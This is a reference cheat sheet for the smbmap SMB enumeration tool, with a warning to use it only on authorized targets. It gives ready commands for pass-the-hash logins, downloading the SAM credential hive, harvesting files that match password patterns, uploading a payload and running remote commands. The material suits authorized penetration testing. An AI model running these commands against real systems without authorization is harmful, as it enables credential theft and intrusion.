# smbmap

> SMB share enumeration and access tool. Use only on authorized targets.

## Quickstart

```bash
# Enumerate shares (null session)
smbmap -H 10.10.10.10

# With credentials
smbmap -H 10.10.10.10 -u user -p 'password' -d DOMAIN

# List directory contents
smbmap -H 10.10.10.10 -u user -p 'password' -r 'C$\Users'

# Recursive listing
smbmap -H 10.10.10.10 -u user -p 'password' -R 'share' --depth 3

# Download file
smbmap -H 10.10.10.10 -u user -p 'password' --download 'share\file.txt'
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Permission mapping | Shows READ/WRITE access per share |
| `-r` / `-R` | List directory (non-recursive / recursive) |
| `-A <regex>` | Auto-download files matching pattern |
| `--depth` | Limit recursion depth |

## Syntax

```text
smbmap -H <host> [auth options] [action options]
```

## Options

### Target

| Option | Description |
|--------|-------------|
| `-H <host>` | Target host |
| `--host-file <file>` | File with list of hosts |
| `-P <port>` | SMB port (default 445) |

### Authentication

| Option | Description |
|--------|-------------|
| `-u <user>` | Username |
| `-p <pass>` | Password or NTLM hash |
| `-d <domain>` | Domain |
| `--prompt` | Prompt for password (safer) |

### Enumeration

| Option | Description |
|--------|-------------|
| (none) | List shares with permissions |
| `-r <path>` | List directory (one level) |
| `-R <path>` | Recursive directory listing |
| `--depth <n>` | Max recursion depth |
| `-L` | List available drives |
| `-v` | Show OS version |
| `--admin` | Check admin status only |

### File Operations

| Option | Description |
|--------|-------------|
| `--download <path>` | Download file |
| `--upload <src> <dst>` | Upload file |
| `--delete <path>` | Delete file |
| `-A <regex>` | Auto-download matching files |

### Output

| Option | Description |
|--------|-------------|
| `--csv <file>` | CSV output |
| `-g <file>` | Grepable output |
| `-q` | Quiet (usable shares only) |
| `--no-banner` | Hide banner |
| `--no-color` | No colors |

### Advanced

| Option | Description |
|--------|-------------|
| `-x <cmd>` | Execute command |
| `--mode wmi|psexec` | Execution method |
| `-F <regex>` | Search file contents |
| `--exclude <shares>` | Exclude shares |

## Recipes

### Share Enumeration

```bash
# Null session
smbmap -H 10.10.10.10

# With creds
smbmap -H 10.10.10.10 -u admin -p 'Password123' -d CORP

# Prompt for password (safer)
smbmap -H 10.10.10.10 -u admin --prompt -d CORP

# Show only accessible shares
smbmap -H 10.10.10.10 -u admin --prompt -q

# Check if admin
smbmap -H 10.10.10.10 -u admin --prompt --admin

# Show OS info
smbmap -H 10.10.10.10 -u admin --prompt -v
```

### Directory Listing

```bash
# List share root
smbmap -H 10.10.10.10 -u admin --prompt -r 'C$'

# List specific path
smbmap -H 10.10.10.10 -u admin --prompt -r 'C$\Users\Administrator'

# Recursive with depth limit
smbmap -H 10.10.10.10 -u admin --prompt -R 'C$\Users' --depth 3

# Directories only (faster)
smbmap -H 10.10.10.10 -u admin --prompt -R 'share' --depth 4 --dir-only
```

### File Download

```bash
# Single file
smbmap -H 10.10.10.10 -u admin --prompt --download 'C$\Windows\System32\config\SAM'

# Auto-download by pattern
smbmap -H 10.10.10.10 -u admin --prompt -R 'C$' --depth 5 \
  -A '\.config$|\.xml$|password'

# Download configs
smbmap -H 10.10.10.10 -u admin --prompt -R 'share\webapp' --depth 3 \
  -A '(web|app)\.config'
```

### File Upload

```bash
# Upload file
smbmap -H 10.10.10.10 -u admin --prompt --upload ./payload.exe 'C$\Temp\payload.exe'
```

### Pass-the-Hash

```bash
# NTLM hash (LM:NT format or just NT)
smbmap -H 10.10.10.10 -u admin -p 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```

### Multi-Host Scanning

```bash
# Scan multiple hosts
smbmap --host-file targets.txt -u admin --prompt -d CORP --csv results.csv
```

### Command Execution

```bash
# Execute command (requires admin)
smbmap -H 10.10.10.10 -u admin --prompt -x 'whoami'

# Specify method
smbmap -H 10.10.10.10 -u admin --prompt --mode psexec -x 'ipconfig /all'
```

### Content Search

```bash
# Search for passwords in files (slow, needs PowerShell)
smbmap -H 10.10.10.10 -u admin --prompt -F 'password' --search-path 'C$\Users'
```

## Output & Parsing

```bash
# CSV report
smbmap -H 10.10.10.10 -u admin --prompt --csv shares.csv

# Grepable output
smbmap -H 10.10.10.10 -u admin --prompt -R 'share' -g listing.txt

# Clean output for scripts
smbmap -H 10.10.10.10 -u admin --prompt -q --no-banner --no-color
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Timeout | Increase `--timeout`, narrow scope |
| Auth failure | Check domain (`-d`), try local account |
| Huge output | Use `--depth`, `--dir-only`, `--exclude` |
| Content search fails | Needs remote exec + PowerShell |
| Download fails | Check path format: `SHARE\path\file` |

## References

- [smbmap GitHub](https://github.com/ShawnDEvans/smbmap)
- [smbmap Manual](https://manpages.ubuntu.com/manpages/noble/man1/smbmap.1.html)
